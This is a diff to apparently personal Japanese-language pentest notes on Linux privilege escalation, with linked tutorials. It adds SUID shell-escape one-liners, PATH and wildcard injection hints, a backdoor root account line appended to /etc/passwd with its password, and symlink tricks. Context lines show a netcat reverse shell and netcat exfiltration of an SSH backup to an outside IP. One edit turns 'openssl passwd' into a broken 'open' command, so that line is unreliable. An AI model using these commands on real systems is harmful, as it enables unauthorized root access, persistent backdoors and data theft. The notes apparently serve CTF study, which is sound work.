@@ -750,11 +750,32 @@ ls -alR /home # check permissions for /home directories
 
 - SUID binaries と capabilitiesを探す
 
+[リンク、まずこれみる](https://mil0.io/linux-privesc/)
+
+[リンク](https://materials.rangeforce.com/tutorial/2019/11/07/Linux-PrivEsc-SUID-Bit/#exploitation-with-file-writing)
+
 ```
 find / -writable -type d 2>/dev/null # show writable folders
 find / -writable -type f 2>/dev/null # show writable files
 find / -perm -4000 -type f 2>/dev/null # search system for suid files
 find / -perm -u=s -type f 2>/dev/null
+
+custom suid実行ファイルを探す。 (default が何か不明な時は、手元のMacOSで上のコマンドを打ち、結果を比較する。)
+
+* common binaries は以下のことを考える: 
+
+cp,mv: You can write anywhere, so move or copy over /etc/passwd to add a user (kind of dangerous) or a SSH key.
+less,more: Call !bash
+man man: Again call !bash
+expect: Call spawn bash, then bash
+awk: Run awk 'BEGIN {system("/bin/sh")}'
+Text editors: Like vi most of these have shell escapes.
+
+```
+
+・ capabilities 確認
+
+```
 
 getcap -r / 2>/dev/null 
 
@@ -764,7 +785,6 @@ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 
 (eval の場合、 `__import__('os').system('nc your_ip port -e /bin/sh')` のように書く)
  
-
 
 ```
 
@@ -788,6 +808,8 @@ ps -ef | grep <process_name>
 
 - PATH injection できるか？
 
+[リンク](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
+
 ```
 
 // 環境変数にキーやパスワードがあったり、隠れたbinファイルをPATHで見つける
@@ -806,6 +828,54 @@ gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%
 /usr/local/sbin:/usr/local/bin → /tmp:/usr/local/sbin:/usr/local/bin 
 
 → sudo /opt/scripts/access_backup.sh
+
+```
+
+
+- wildcard injection できるか？
+
+[リンク](https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/)
+
+```
+
+
+tar cf /var/backups/backup.tar *
+
+```
+
+- etc/passwd が writeable か？
+
+```
+root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
+
+root2: username
+WVLY0mgH0RtUI: encrypted password (mrcake)
+0:0: user id and group id are both 0(root)
+root: comment field
+/root: home directory
+/bin/bash: default shell
+
+```
+
+
+- symlink を使って、/etc/passwd を上書きできるか？
+
+ln コマンドを使う
+
+```
+
+ln -s mylist02.txt latest
+
+```
+
+これで、「latest」というファイルを編集したり、閲覧したりすることが、「mylist02.txt」を編集したり、閲覧したりすることと同じ結果になる。
+
+```
+
+mkdir source
+cp /etc/passwd source/passwd 
+echo 'root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash' >> source/passwd 
+
 
 ```
 
@@ -1628,7 +1698,7 @@ nc 10.10.14.2 1337 < /home/david/public_www/protected-file-area/backup-ssh-ident
 ```
 (イエラエセキュリティ勉強会ででてきた)
 
-openssl passwd -1 -salt xxxxxxxx password;
+open -1 -salt xxxxxxxx password;
 →  xxj31ZMTZzkVA
 
 root:x:....
